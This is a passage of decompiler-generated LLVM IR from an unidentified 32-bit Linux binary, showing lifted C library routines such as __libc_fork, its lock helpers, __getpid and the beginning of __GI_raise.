  uselistorder i32 45, { 1, 2, 3, 4, 0 }
  uselistorder i32 43, { 6, 2, 0, 3, 1, 4, 7, 8, 5 }
  uselistorder i32 41, { 1, 3, 2, 4, 5, 0, 6, 7, 8 }
  uselistorder i32 38, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder i32 37, { 4, 1, 0, 2, 3 }
  uselistorder i32 34, { 2, 0, 1 }
  uselistorder i32 31, { 2, 3, 6, 4, 5, 1, 7, 8, 9, 0, 10 }
  uselistorder i32 29, { 2, 0, 1 }
  uselistorder i32 27, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 25, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 23, { 11, 1, 6, 2, 7, 3, 8, 4, 9, 5, 10, 0 }
  uselistorder i32 21, { 5, 1, 3, 2, 4, 0 }
  uselistorder i32 13, { 4, 5, 6, 0, 7, 1, 8, 9, 2, 10, 11, 12, 3 }
  uselistorder i32 6, { 2, 31, 21, 22, 68, 23, 11, 24, 12, 25, 13, 26, 33, 32, 34, 14, 35, 36, 37, 38, 39, 40, 41, 42, 28, 43, 44, 45, 27, 29, 20, 30, 46, 47, 48, 3, 49, 50, 51, 4, 52, 53, 54, 5, 6, 55, 15, 7, 56, 16, 8, 0, 1, 57, 17, 58, 59, 60, 61, 18, 9, 62, 63, 64, 65, 66, 19, 10, 67 }
  uselistorder i32 5, { 29, 3, 36, 37, 0, 15, 16, 13, 17, 14, 18, 31, 30, 32, 25, 19, 26, 27, 20, 28, 1, 21, 22, 5, 6, 7, 8, 9, 33, 10, 11, 12, 23, 34, 24, 35, 4, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80532d3, { 36, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 30, 24, 25, 26, 27, 28, 29, 31, 32, 33, 0, 1, 35, 34 }
  uselistorder label %dec_label_pc_80531fd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80531f1, { 1, 0 }
  uselistorder label %dec_label_pc_80531e9, { 1, 0 }
  uselistorder label %dec_label_pc_80531ce.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80531a8, { 1, 0 }
  uselistorder label %dec_label_pc_80530fd, { 36, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %v0_805332f2 = load i32, i32* @global_var_805adfc.316, align 4
  store i32 %v0_805332f2, i32* @ebx, align 4
  %v1_80533353 = icmp eq i32 %v0_805332f2, 0
  %v1_80533375 = icmp eq i1 %v1_80533353, false
  br i1 %v1_80533375, label %dec_label_pc_80532e7, label %dec_label_pc_8053340

dec_label_pc_80532e7:                             ; preds = %entry, %dec_label_pc_805332f.backedge
  %v0_80532ee = phi i32 [ %v0_805332f, %dec_label_pc_805332f.backedge ], [ %v0_805332f2, %entry ]
  %v1_80532e7 = add i32 %v0_80532ee, 20
  %v2_80532e7 = inttoptr i32 %v1_80532e7 to i32*
  %v3_80532e7 = load i32, i32* %v2_80532e7, align 4
  %v1_80532ea = icmp eq i32 %v3_80532e7, 0
  br i1 %v1_80532ea, label %dec_label_pc_805332f.backedge, label %dec_label_pc_80532ee

dec_label_pc_805332f.backedge:                    ; preds = %dec_label_pc_80532ee.dec_label_pc_805332f.backedge_crit_edge, %dec_label_pc_80532e7
  %v0_805332f = phi i32 [ %v0_805332f.pre, %dec_label_pc_80532ee.dec_label_pc_805332f.backedge_crit_edge ], [ %v0_80532ee, %dec_label_pc_80532e7 ]
  store i32 %v0_805332f, i32* @ebx, align 4
  %v1_8053335 = icmp eq i32 %v0_805332f, 0
  %v1_8053337 = icmp eq i1 %v1_8053335, false
  br i1 %v1_8053337, label %dec_label_pc_80532e7, label %dec_label_pc_805332f.dec_label_pc_8053340.loopexit1_crit_edge

dec_label_pc_80532ee:                             ; preds = %dec_label_pc_80532e7
  store i32 %v0_80532ee, i32* @esi, align 4
  %v1_80532f4 = add i32 %v3_80532e7, 1
  %v3_80532f9 = load i32, i32* %v2_80532e7, align 4
  %v16_80532f9 = icmp eq i32 %v3_80532f9, %v3_80532e7
  %v23_80532f9 = select i1 %v16_80532f9, i32 %v1_80532f4, i32 %v3_80532f9
  store i32 %v23_80532f9, i32* %v2_80532e7, align 4
  %v1_8053300 = icmp eq i1 %v16_80532f9, false
  br i1 %v1_8053300, label %dec_label_pc_80532ee.dec_label_pc_805332f.backedge_crit_edge, label %dec_label_pc_8053302

dec_label_pc_80532ee.dec_label_pc_805332f.backedge_crit_edge: ; preds = %dec_label_pc_80532ee
  %v0_805332f.pre = load i32, i32* @global_var_805adfc.316, align 4
  br label %dec_label_pc_805332f.backedge

dec_label_pc_8053302:                             ; preds = %dec_label_pc_80532ee
  %v15_805330d = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_8053304

dec_label_pc_8053304:                             ; preds = %dec_label_pc_8053327, %dec_label_pc_8053302
  %storemerge = phi i32 [ 0, %dec_label_pc_8053302 ], [ %v15_805330d, %dec_label_pc_8053327 ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_8053304 = load i32, i32* @ebx, align 4
  %v1_8053304 = add i32 %v0_8053304, 4
  %v2_8053304 = inttoptr i32 %v1_8053304 to i32*
  %v3_8053304 = load i32, i32* %v2_8053304, align 4
  %v1_8053307 = icmp eq i32 %v3_8053304, 0
  br i1 %v1_8053307, label %dec_label_pc_805330d, label %dec_label_pc_805330b

dec_label_pc_805330b:                             ; preds = %dec_label_pc_8053304
  call void @__pseudo_call(i32 %v3_8053304)
  %v0_8053317.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805330d

dec_label_pc_805330d:                             ; preds = %dec_label_pc_8053304, %dec_label_pc_805330b
  %v0_8053317 = phi i32 [ %v0_8053304, %dec_label_pc_8053304 ], [ %v0_8053317.pre, %dec_label_pc_805330b ]
  store i32 %v0_8053317, i32* %stack_var_-48, align 4
  %v1_805331c = inttoptr i32 %v0_8053317 to i32*
  %v2_805331c = load i32, i32* %v1_805331c, align 4
  store i32 %v2_805331c, i32* @ebx, align 4
  %v1_805331e = icmp eq i32 %v2_805331c, 0
  %v1_8053320 = icmp eq i1 %v1_805331e, false
  br i1 %v1_8053320, label %dec_label_pc_8053327, label %dec_label_pc_8053340

dec_label_pc_8053327:                             ; preds = %dec_label_pc_805330d
  %v1_8053327 = add i32 %v2_805331c, 20
  %v2_8053327 = inttoptr i32 %v1_8053327 to i32*
  %v3_8053327 = load i32, i32* %v2_8053327, align 4
  %v4_8053327 = add i32 %v3_8053327, 1
  store i32 %v4_8053327, i32* %v2_8053327, align 4
  br label %dec_label_pc_8053304

dec_label_pc_805332f.dec_label_pc_8053340.loopexit1_crit_edge: ; preds = %dec_label_pc_805332f.backedge
  br label %dec_label_pc_8053340

dec_label_pc_8053340:                             ; preds = %dec_label_pc_805330d, %entry, %dec_label_pc_805332f.dec_label_pc_8053340.loopexit1_crit_edge
  %v0_8053340 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v0_8053347 = load i32, i32* @global_var_8058300.317, align 256
  %v12_8053347 = icmp eq i32 %v0_8053347, %v0_8053340
  call void @__pseudo_cond_branch(i1 %v12_8053347, i32 ptrtoint (i32* @global_var_8053374.318 to i32))
  %v0_8053356 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8053356 = icmp eq i32 %v0_8053356, 0
  call void @__pseudo_cond_branch(i1 %v1_8053356, i32 134558561)
  %v0_8053360 = load i32, i32* @global_var_80582f8.319, align 8
  %v13_8053360 = icmp eq i32 %v0_8053360, 0
  %v20_8053360 = select i1 %v13_8053360, i32 1, i32 %v0_8053360
  store i32 %v20_8053360, i32* @global_var_80582f8.319, align 8
  %v1_8053368 = icmp eq i1 %v13_8053360, false
  call void @__pseudo_cond_branch(i1 %v1_8053368, i32 134558952)
  ret i32 %v0_8053360

; uselistorder directives
  uselistorder i32 %v0_8053360, { 1, 2, 0 }
  uselistorder i32 %v0_8053317, { 1, 0 }
  uselistorder i32 %v3_80532f9, { 1, 0 }
  uselistorder i32 %v0_805332f, { 2, 1, 0 }
  uselistorder i32 %v0_80532ee, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053340, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805330d, { 1, 0 }
  uselistorder label %dec_label_pc_80532e7, { 1, 0 }
}

define i32 @function_805336e() local_unnamed_addr {
dec_label_pc_805336e:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %v0_805336e = load i32, i32* @edx, align 4
  store i32 %v0_805336e, i32* @global_var_8058300.317, align 256
  %v0_8053374 = load i32, i32* @global_var_80582fc.320, align 4
  %v1_8053374 = add i32 %v0_8053374, 1
  store i32 %v1_8053374, i32* @global_var_80582fc.320, align 4
  %v0_805337a = load i32, i32* inttoptr (i32 108 to i32*), align 4
  store i32 %v0_805337a, i32* %eax.global-to-local, align 4
  %v1_8053383 = load i32, i32* @ebp, align 4
  %v2_8053383 = add i32 %v1_8053383, -20
  %v3_8053383 = inttoptr i32 %v2_8053383 to i32*
  store i32 %v0_805337a, i32* %v3_8053383, align 4
  %v0_8053386 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053386 = sub i32 0, %v0_8053386
  store i32 %v1_8053386, i32* inttoptr (i32 108 to i32*), align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 120, i32* %eax.global-to-local, align 4
  %v8_80533a6 = call i32 (i32 (i32*)*, i32*, i32, i32*, ...) @clone(i32 (i32*)* inttoptr (i32 18874385 to i32 (i32*)*), i32* null, i32 0, i32* null)
  store i32 %v8_80533a6, i32* %eax.global-to-local, align 4
  %tmp18 = icmp ult i32 %v8_80533a6, -4095
  br i1 %tmp18, label %dec_label_pc_80533c4, label %dec_label_pc_80533b2

dec_label_pc_80533b2:                             ; preds = %dec_label_pc_805336e
  store i32 -8, i32* %eax.global-to-local, align 4
  %v1_80533ba = sub i32 0, %v8_80533a6
  store i32 %v1_80533ba, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805345e

dec_label_pc_80533c4:                             ; preds = %dec_label_pc_805336e
  store i32 %v8_80533a6, i32* @esi, align 4
  %v1_80533c6 = icmp eq i32 %v8_80533a6, 0
  %v1_80533c8 = icmp eq i1 %v1_80533c6, false
  br i1 %v1_80533c8, label %dec_label_pc_805345e, label %dec_label_pc_80533ce

dec_label_pc_80533ce:                             ; preds = %dec_label_pc_80533c4
  %v0_80533ce = load i32, i32* @global_var_805adf8.321, align 8
  store i32 %v0_80533ce, i32* %eax.global-to-local, align 4
  %v1_80533d3 = icmp eq i32 %v0_80533ce, 0
  br i1 %v1_80533d3, label %dec_label_pc_80533da, label %dec_label_pc_80533d7

dec_label_pc_80533d7:                             ; preds = %dec_label_pc_80533ce
  %v1_80533d7 = inttoptr i32 %v0_80533ce to i32*
  %v2_80533d7 = load i32, i32* %v1_80533d7, align 4
  %v3_80533d7 = add i32 %v2_80533d7, 4
  store i32 %v3_80533d7, i32* %v1_80533d7, align 4
  br label %dec_label_pc_80533da

dec_label_pc_80533da:                             ; preds = %dec_label_pc_80533ce, %dec_label_pc_80533d7
  %v0_80533da = load i32, i32* inttoptr (i32 104 to i32*), align 8
  store i32 %v0_80533da, i32* inttoptr (i32 108 to i32*), align 4
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_8057c18.322 to i32*), align 4
  store i32 %storemerge8, i32* %eax.global-to-local, align 4
  %v1_80534059 = icmp eq i32 %storemerge8, 0
  %v1_805340711 = icmp eq i1 %v1_80534059, false
  br i1 %v1_805340711, label %dec_label_pc_80533ed, label %dec_label_pc_8053409

dec_label_pc_80533ed:                             ; preds = %dec_label_pc_80533da, %dec_label_pc_80533ed
  %v0_80533ed = phi i32 [ %storemerge, %dec_label_pc_80533ed ], [ %storemerge8, %dec_label_pc_80533da ]
  %v1_80533ed = add i32 %v0_80533ed, 64
  %v2_80533ed = inttoptr i32 %v1_80533ed to i32*
  store i32 0, i32* %v2_80533ed, align 4
  %v0_80533f4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80533f4 = add i32 %v0_80533f4, 60
  %v2_80533f4 = inttoptr i32 %v1_80533f4 to i32*
  store i32 0, i32* %v2_80533f4, align 4
  %v0_80533fb = load i32, i32* %eax.global-to-local, align 4
  %v1_80533fb = add i32 %v0_80533fb, 56
  %v2_80533fb = inttoptr i32 %v1_80533fb to i32*
  store i32 0, i32* %v2_80533fb, align 4
  %v0_8053402 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053402 = add i32 %v0_8053402, 32
  %v2_8053402 = inttoptr i32 %v1_8053402 to i32*
  %storemerge = load i32, i32* %v2_8053402, align 4
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8053405 = icmp eq i32 %storemerge, 0
  %v1_8053407 = icmp eq i1 %v1_8053405, false
  br i1 %v1_8053407, label %dec_label_pc_80533ed, label %dec_label_pc_8053405.dec_label_pc_8053409_crit_edge

dec_label_pc_8053405.dec_label_pc_8053409_crit_edge: ; preds = %dec_label_pc_80533ed
  br label %dec_label_pc_8053409

dec_label_pc_8053409:                             ; preds = %dec_label_pc_8053405.dec_label_pc_8053409_crit_edge, %dec_label_pc_80533da
  store i32 0, i32* @global_var_8058300.317, align 256
  store i32 0, i32* @global_var_80582fc.320, align 4
  store i32 0, i32* @global_var_80582f8.319, align 8
  %v0_80534491 = load i32, i32* @ebp, align 4
  %v1_80534492 = add i32 %v0_80534491, -16
  %v2_80534493 = inttoptr i32 %v1_80534492 to i32*
  %v3_80534494 = load i32, i32* %v2_80534493, align 4
  %v4_80534495 = icmp eq i32 %v3_80534494, 0
  %v1_805344d7 = icmp eq i1 %v4_80534495, false
  br i1 %v1_805344d7, label %dec_label_pc_8053429, label %dec_label_pc_805344f

dec_label_pc_8053429:                             ; preds = %dec_label_pc_8053409, %dec_label_pc_8053437
  %v3_8053429 = phi i32 [ %v3_8053449, %dec_label_pc_8053437 ], [ %v3_80534494, %dec_label_pc_8053409 ]
  %v0_8053429 = phi i32 [ %v0_8053449, %dec_label_pc_8053437 ], [ %v0_80534491, %dec_label_pc_8053409 ]
  %v1_805342c = inttoptr i32 %v3_8053429 to i32*
  %v2_805342c = load i32, i32* %v1_805342c, align 4
  store i32 %v2_805342c, i32* %eax.global-to-local, align 4
  %v1_805342e = add i32 %v2_805342c, 12
  %v2_805342e = inttoptr i32 %v1_805342e to i32*
  %v3_805342e = load i32, i32* %v2_805342e, align 4
  store i32 %v3_805342e, i32* %eax.global-to-local, align 4
  %v1_8053431 = icmp eq i32 %v3_805342e, 0
  br i1 %v1_8053431, label %dec_label_pc_8053437, label %dec_label_pc_8053435

dec_label_pc_8053435:                             ; preds = %dec_label_pc_8053429
  call void @__pseudo_call(i32 %v3_805342e)
  %v0_8053437.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8053437

dec_label_pc_8053437:                             ; preds = %dec_label_pc_8053429, %dec_label_pc_8053435
  %v0_8053437 = phi i32 [ %v0_8053429, %dec_label_pc_8053429 ], [ %v0_8053437.pre, %dec_label_pc_8053435 ]
  %v1_8053437 = add i32 %v0_8053437, -16
  %v2_8053437 = inttoptr i32 %v1_8053437 to i32*
  %v3_8053437 = load i32, i32* %v2_8053437, align 4
  store i32 %v3_8053437, i32* %ecx.global-to-local, align 4
  %v1_805343a = inttoptr i32 %v3_8053437 to i32*
  %v2_805343a = load i32, i32* %v1_805343a, align 4
  store i32 %v2_805343a, i32* %eax.global-to-local, align 4
  %v1_805343c = add i32 %v2_805343a, 20
  %v2_805343c = inttoptr i32 %v1_805343c to i32*
  store i32 1, i32* %v2_805343c, align 4
  %v0_8053443 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053443 = add i32 %v0_8053443, 4
  %v2_8053443 = inttoptr i32 %v1_8053443 to i32*
  %v3_8053443 = load i32, i32* %v2_8053443, align 4
  store i32 %v3_8053443, i32* %eax.global-to-local, align 4
  %v1_8053446 = load i32, i32* @ebp, align 4
  %v2_8053446 = add i32 %v1_8053446, -16
  %v3_8053446 = inttoptr i32 %v2_8053446 to i32*
  store i32 %v3_8053443, i32* %v3_8053446, align 4
  %v0_8053449 = load i32, i32* @ebp, align 4
  %v1_8053449 = add i32 %v0_8053449, -16
  %v2_8053449 = inttoptr i32 %v1_8053449 to i32*
  %v3_8053449 = load i32, i32* %v2_8053449, align 4
  %v4_8053449 = icmp eq i32 %v3_8053449, 0
  %v1_805344d = icmp eq i1 %v4_8053449, false
  br i1 %v1_805344d, label %dec_label_pc_8053429, label %dec_label_pc_805344f

dec_label_pc_805344f:                             ; preds = %dec_label_pc_8053437, %dec_label_pc_8053409
  store i32 0, i32* @global_var_8057d9c.323, align 4
  %v0_8053459 = call i32 @function_80534de()
  store i32 %v0_8053459, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805345e

dec_label_pc_805345e:                             ; preds = %dec_label_pc_80533c4, %dec_label_pc_805344f, %dec_label_pc_80533b2
  %v0_805345e = load i32, i32* @ebp, align 4
  %v1_805345e = add i32 %v0_805345e, -20
  %v2_805345e = inttoptr i32 %v1_805345e to i32*
  %v3_805345e = load i32, i32* %v2_805345e, align 4
  store i32 %v3_805345e, i32* inttoptr (i32 108 to i32*), align 4
  %v0_8053468 = load i32, i32* @global_var_80582fc.320, align 4
  %v1_805346d = add i32 %v0_8053468, -1
  %v8_805346d = icmp eq i32 %v1_805346d, 0
  store i32 %v1_805346d, i32* %eax.global-to-local, align 4
  store i32 %v1_805346d, i32* @global_var_80582fc.320, align 4
  %v1_8053475 = icmp eq i1 %v8_805346d, false
  call void @__pseudo_cond_branch(i1 %v1_8053475, i32 134558936)
  store i32 0, i32* @global_var_8058300.317, align 256
  %v0_8053481 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8053481 = icmp eq i32 %v0_8053481, 0
  call void @__pseudo_cond_branch(i1 %v1_8053481, i32 134558860)
  %v0_805348b = load i32, i32* @global_var_80582f8.319, align 8
  %v1_805348b = add i32 %v0_805348b, -1
  %v9_805348b = icmp eq i32 %v1_805348b, 0
  store i32 %v1_805348b, i32* @global_var_80582f8.319, align 8
  %v1_8053493 = icmp eq i1 %v9_805348b, false
  call void @__pseudo_cond_branch(i1 %v1_8053493, i32 134558968)
  ret i32 %v1_805346d

; uselistorder directives
  uselistorder i32 %v1_805348b, { 1, 0 }
  uselistorder i32 %v1_805346d, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8053449, { 1, 0 }
  uselistorder i32 %v0_8053449, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v8_80533a6, { 3, 2, 1, 0, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 2, 8, 9, 10, 11, 6, 3, 4, 5, 1, 12, 16, 0, 13, 14, 15 }
  uselistorder i32 120, { 3, 2, 1, 0 }
  uselistorder i32 -20, { 12, 13, 4, 2, 5, 6, 3, 7, 8, 9, 0, 10, 1, 11 }
  uselistorder label %dec_label_pc_805345e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053437, { 1, 0 }
  uselistorder label %dec_label_pc_8053429, { 1, 0 }
  uselistorder label %dec_label_pc_80533ed, { 1, 0 }
  uselistorder label %dec_label_pc_80533da, { 1, 0 }
}

define i32 @function_8053495() local_unnamed_addr {
dec_label_pc_8053495:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %v0_80534d81 = load i32, i32* @ebp, align 4
  %v1_80534d82 = add i32 %v0_80534d81, -16
  %v2_80534d83 = inttoptr i32 %v1_80534d82 to i32*
  %v3_80534d84 = load i32, i32* %v2_80534d83, align 4
  %v4_80534d85 = icmp eq i32 %v3_80534d84, 0
  %v1_80534dc7 = icmp eq i1 %v4_80534d85, false
  br i1 %v1_80534dc7, label %dec_label_pc_8053497, label %dec_label_pc_80534d8._crit_edge

dec_label_pc_8053497:                             ; preds = %dec_label_pc_8053495, %dec_label_pc_80534cf
  %v3_8053497 = phi i32 [ %v3_80534d8, %dec_label_pc_80534cf ], [ %v3_80534d84, %dec_label_pc_8053495 ]
  %v0_8053497 = phi i32 [ %v0_80534d8, %dec_label_pc_80534cf ], [ %v0_80534d81, %dec_label_pc_8053495 ]
  store i32 %v3_8053497, i32* %ecx.global-to-local, align 4
  %v1_805349a = inttoptr i32 %v3_8053497 to i32*
  %v2_805349a = load i32, i32* %v1_805349a, align 4
  store i32 %v2_805349a, i32* %eax.global-to-local, align 4
  %v1_805349c = add i32 %v2_805349a, 8
  %v2_805349c = inttoptr i32 %v1_805349c to i32*
  %v3_805349c = load i32, i32* %v2_805349c, align 4
  store i32 %v3_805349c, i32* %eax.global-to-local, align 4
  %v1_805349f = icmp eq i32 %v3_805349c, 0
  br i1 %v1_805349f, label %dec_label_pc_80534a5, label %dec_label_pc_80534a3

dec_label_pc_80534a3:                             ; preds = %dec_label_pc_8053497
  %v0_80534a3 = load i32, i32* @esp, align 4
  %v1_80534a3 = add i32 %v0_80534a3, -4
  %v2_80534a3 = inttoptr i32 %v1_80534a3 to i32*
  store i32 134558885, i32* %v2_80534a3, align 4
  call void @__pseudo_call(i32 %v3_805349c)
  %v0_80534a5.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80534a5

dec_label_pc_80534a5:                             ; preds = %dec_label_pc_8053497, %dec_label_pc_80534a3
  %v0_80534a5 = phi i32 [ %v0_8053497, %dec_label_pc_8053497 ], [ %v0_80534a5.pre, %dec_label_pc_80534a3 ]
  %v1_80534a5 = add i32 %v0_80534a5, -16
  %v2_80534a5 = inttoptr i32 %v1_80534a5 to i32*
  %v3_80534a5 = load i32, i32* %v2_80534a5, align 4
  store i32 %v3_80534a5, i32* %eax.global-to-local, align 4
  %v1_80534a8 = inttoptr i32 %v3_80534a5 to i32*
  %v2_80534a8 = load i32, i32* %v1_80534a8, align 4
  store i32 %v2_80534a8, i32* %ecx.global-to-local, align 4
  %v1_80534aa = add i32 %v2_80534a8, 20
  %v2_80534aa = inttoptr i32 %v1_80534aa to i32*
  %v3_80534aa = load i32, i32* %v2_80534aa, align 4
  %v4_80534aa = add i32 %v3_80534aa, -1
  %v11_80534aa = icmp eq i32 %v4_80534aa, 0
  store i32 %v4_80534aa, i32* %v2_80534aa, align 4
  %v1_80534ae = zext i1 %v11_80534aa to i32
  %v2_80534ae = load i32, i32* %eax.global-to-local, align 4
  %v3_80534ae = and i32 %v2_80534ae, -256
  %v4_80534ae = or i32 %v3_80534ae, %v1_80534ae
  store i32 %v4_80534ae, i32* @eax, align 4
  %v4_80534b1 = icmp eq i1 %v11_80534aa, false
  br i1 %v4_80534b1, label %dec_label_pc_80534cf, label %dec_label_pc_80534b5

dec_label_pc_80534b5:                             ; preds = %dec_label_pc_80534a5
  %v0_80534b5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80534b5 = add i32 %v0_80534b5, 24
  %v2_80534b5 = inttoptr i32 %v1_80534b5 to i32*
  %v3_80534b5 = load i32, i32* %v2_80534b5, align 4
  %v4_80534b5 = icmp eq i32 %v3_80534b5, 0
  br i1 %v4_80534b5, label %dec_label_pc_80534cf, label %dec_label_pc_80534bb

dec_label_pc_80534bb:                             ; preds = %dec_label_pc_80534b5
  store i32 240, i32* %eax.global-to-local, align 4
  store i32 129, i32* %ecx.global-to-local, align 4
  %v1_80534cd = call i32 @int80_syscall(i32 240)
  store i32 %v1_80534cd, i32* @eax, align 4
  br label %dec_label_pc_80534cf

dec_label_pc_80534cf:                             ; preds = %dec_label_pc_80534bb, %dec_label_pc_80534b5, %dec_label_pc_80534a5
  %v0_80534cf = load i32, i32* @ebp, align 4
  %v1_80534cf = add i32 %v0_80534cf, -16
  %v2_80534cf = inttoptr i32 %v1_80534cf to i32*
  %v3_80534cf = load i32, i32* %v2_80534cf, align 4
  %v1_80534d2 = add i32 %v3_80534cf, 4
  %v2_80534d2 = inttoptr i32 %v1_80534d2 to i32*
  %v3_80534d2 = load i32, i32* %v2_80534d2, align 4
  store i32 %v3_80534d2, i32* %v2_80534cf, align 4
  %v0_80534d8 = load i32, i32* @ebp, align 4
  %v1_80534d8 = add i32 %v0_80534d8, -16
  %v2_80534d8 = inttoptr i32 %v1_80534d8 to i32*
  %v3_80534d8 = load i32, i32* %v2_80534d8, align 4
  %v4_80534d8 = icmp eq i32 %v3_80534d8, 0
  %v1_80534dc = icmp eq i1 %v4_80534d8, false
  br i1 %v1_80534dc, label %dec_label_pc_8053497, label %dec_label_pc_80534d8._crit_edge

dec_label_pc_80534d8._crit_edge:                  ; preds = %dec_label_pc_80534cf, %dec_label_pc_8053495
  %v2_80534dc = load i32, i32* @eax, align 4
  ret i32 %v2_80534dc

; uselistorder directives
  uselistorder i32 %v3_80534d8, { 1, 0 }
  uselistorder i32 %v0_80534d8, { 1, 0 }
  uselistorder i1 %v11_80534aa, { 1, 0 }
  uselistorder i32 %v4_80534aa, { 1, 0 }
  uselistorder i32 %v3_8053497, { 1, 0 }
  uselistorder i32 129, { 1, 0 }
  uselistorder label %dec_label_pc_80534a5, { 1, 0 }
  uselistorder label %dec_label_pc_8053497, { 1, 0 }
}

define i32 @function_80534de() local_unnamed_addr {
dec_label_pc_80534de:
  %v0_80534e1 = load i32, i32* @esi, align 4
  ret i32 %v0_80534e1
}

define i32 @_L_lock_70() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_80582f8.319 to i32), i32* @ecx, align 4
  %v0_80534ee = call i32 @__lll_lock_wait_private()
  %v0_80534f3 = call i32 @function_805336e()
  ret i32 %v0_80534f3
}

define i32 @_L_unlock_167() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_80582f8.319 to i32), i32* @eax, align 4
  %v0_80534fe = call i32 @__lll_unlock_wake_private()
  store i32 %v0_80534fe, i32* @eax, align 4
  %v0_8053503 = call i32 @function_8053495()
  ret i32 %v0_8053503
}

define i32 @__getpid() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8053508 = load i32, i32* inttoptr (i32 108 to i32*), align 4
  store i32 %v0_8053508, i32* %edx.global-to-local, align 4
  %tmp = icmp slt i32 %v0_8053508, 1
  %tmp2 = icmp eq i1 %tmp, false
  br i1 %tmp2, label %dec_label_pc_8053536, label %dec_label_pc_8053516

dec_label_pc_8053516:                             ; preds = %entry
  %v1_8053511 = icmp eq i32 %v0_8053508, 0
  %v4_8053514 = icmp eq i1 %v1_8053511, false
  br i1 %v4_8053514, label %dec_label_pc_8053523, label %dec_label_pc_8053518

dec_label_pc_8053518:                             ; preds = %dec_label_pc_8053516
  %v0_8053518 = load i32, i32* inttoptr (i32 104 to i32*), align 8
  store i32 %v0_8053518, i32* %edx.global-to-local, align 4
  %v1_805351f = icmp eq i32 %v0_8053518, 0
  %v1_8053521 = icmp eq i1 %v1_805351f, false
  br i1 %v1_8053521, label %dec_label_pc_8053536, label %dec_label_pc_8053523

dec_label_pc_8053523:                             ; preds = %dec_label_pc_8053518, %dec_label_pc_8053516
  %v0_8053528 = call i32 @getpid()
  store i32 %v0_8053528, i32* %edx.global-to-local, align 4
  br i1 %v4_8053514, label %dec_label_pc_8053536, label %dec_label_pc_8053530

dec_label_pc_8053530:                             ; preds = %dec_label_pc_8053523
  store i32 %v0_8053528, i32* inttoptr (i32 104 to i32*), align 8
  %v0_8053536.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053536

dec_label_pc_8053536:                             ; preds = %dec_label_pc_8053523, %dec_label_pc_8053518, %entry, %dec_label_pc_8053530
  %v0_8053536 = phi i32 [ %v0_8053528, %dec_label_pc_8053523 ], [ %v0_8053518, %dec_label_pc_8053518 ], [ %v0_8053508, %entry ], [ %v0_8053536.pre, %dec_label_pc_8053530 ]
  ret i32 %v0_8053536

; uselistorder directives
  uselistorder i32 %v0_8053508, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8053536, { 3, 0, 1, 2 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805353c = load i32, i32* @ebx, align 4
  store i32 %v0_805353c, i32* %stack_var_-4, align 4
  %v0_805353d = load i32, i32* inttoptr (i32 108 to i32*), align 4
  %v0_8053544 = load i32, i32* inttoptr (i32 104 to i32*), align 8
  %v1_805354b = icmp eq i32 %v0_8053544, 0
  %v1_805354d = icmp eq i1 %v1_805354b, false
  br i1 %v1_805354d, label %dec_label_pc_8053562, label %dec_label_pc_805354f

dec_label_pc_805354f:                             ; preds = %entry
  %v1_8053554 = call i32 @int80_syscall(i32 224)
  store i32 %v1_8053554, i32* inttoptr (i32 104 to i32*), align 8
  br label %dec_label_pc_8053576

dec_label_pc_8053562:                             ; preds = %entry
  %tmp6 = icmp slt i32 %v0_805353d, 1
  %tmp7 = icmp eq i1 %tmp6, false
  br i1 %tmp7, label %dec_label_pc_8053576, label %dec_label_pc_8053568

dec_label_pc_8053568:                             ; preds = %dec_label_pc_8053562
  %v1_805356a = urem i32 %v0_805353d, -2147483648
  %v2_805356a = icmp eq i32 %v1_805356a, 0
  br i1 %v2_805356a, label %dec_label_pc_8053576, label %dec_label_pc_8053572

dec_label_pc_8053572:                             ; preds = %dec_label_pc_8053568
  br label %dec_label_pc_8053576

dec_label_pc_8053576:                             ; preds = %dec_label_pc_8053568, %dec_label_pc_8053562, %dec_label_pc_805354f, %dec_label_pc_8053572
